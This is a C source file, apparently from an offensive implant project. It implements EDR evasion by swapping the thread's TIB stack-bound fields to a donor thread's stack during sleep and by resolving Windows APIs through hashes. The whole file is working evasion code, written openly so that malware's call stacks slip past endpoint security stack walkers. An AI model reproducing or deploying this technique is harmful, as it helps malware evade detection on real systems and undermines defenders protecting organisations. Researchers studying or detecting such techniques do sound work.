/**
 * CFG/CET-compatible stack spoofing via TIB stack-bound manipulation.
 *
 * EDR stack walkers follow TIB.StackBase / TIB.StackLimit (gs:[0x08], gs:[0x10]).
 * Swapping only those fields (not RIP/RSP in CONTEXT) keeps CET shadow stacks valid
 * while presenting a donor thread's stack region during sleep.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include "../../include/evasion.h"
#include "../../include/iat_obf.h"

#ifndef ThreadBasicInformation
#define ThreadBasicInformation 0
#endif

typedef struct _THREAD_BASIC_INFORMATION {
    LONG  ExitStatus;
    PVOID TebBaseAddress;
} THREAD_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *fnNtQueryInformationThread)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static PVOID read_teb_stack_field(PVOID teb, SIZE_T offset) {
    if (!teb)
        return NULL;
    return *(PVOID *)((BYTE *)teb + offset);
}

BOOL stack_spoof_find_donor(STACK_SPOOF_CTX *ctx) {
    if (!ctx)
        return FALSE;

    ZeroMemory(ctx, sizeof(*ctx));

    HMODULE ntd = get_module_by_hash(HASH_NTDLL_DLL);
    if (!ntd)
        ntd = GetModuleHandleA("ntdll.dll");
    if (!ntd)
        return FALSE;

    fnNtQueryInformationThread pQuery =
        (fnNtQueryInformationThread)resolve_api(ntd, HASH_NtQueryInformationThread);
    if (!pQuery)
        return FALSE;

    DWORD self_pid = GetCurrentProcessId();
    DWORD self_tid = GetCurrentThreadId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return FALSE;

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    BOOL found = FALSE;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != self_pid)
                continue;
            if (te.th32ThreadID == self_tid)
                continue;

            HANDLE hThread = OpenThread(
                THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME,
                FALSE, te.th32ThreadID);
            if (!hThread)
                continue;

            THREAD_BASIC_INFORMATION tbi = {0};
            ULONG ret_len = 0;
            NTSTATUS st = pQuery(hThread, ThreadBasicInformation,
                                 &tbi, sizeof(tbi), &ret_len);
            CloseHandle(hThread);

            if (st != 0 || !tbi.TebBaseAddress)
                continue;

            PVOID stack_base = read_teb_stack_field(tbi.TebBaseAddress, 0x08);
            PVOID stack_limit = read_teb_stack_field(tbi.TebBaseAddress, 0x10);
            if (!stack_base || !stack_limit || stack_base <= stack_limit)
                continue;

            ctx->spoof_stack_base = stack_base;
            ctx->spoof_stack_limit = stack_limit;
            ctx->donor_thread_id = te.th32ThreadID;
            found = TRUE;
            break;
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return found;
}

BOOL stack_spoof_apply(STACK_SPOOF_CTX *ctx) {
    if (!ctx || ctx->active || !ctx->spoof_stack_base || !ctx->spoof_stack_limit)
        return FALSE;

    ctx->saved_stack_base = (PVOID)__readgsqword(0x08);
    ctx->saved_stack_limit = (PVOID)__readgsqword(0x10);

    __writegsqword(0x08, (DWORD64)ctx->spoof_stack_base);
    __writegsqword(0x10, (DWORD64)ctx->spoof_stack_limit);
    ctx->active = TRUE;
    return TRUE;
}

BOOL stack_spoof_restore(STACK_SPOOF_CTX *ctx) {
    if (!ctx || !ctx->active)
        return FALSE;

    __writegsqword(0x08, (DWORD64)ctx->saved_stack_base);
    __writegsqword(0x10, (DWORD64)ctx->saved_stack_limit);
    ctx->active = FALSE;
    return TRUE;
}
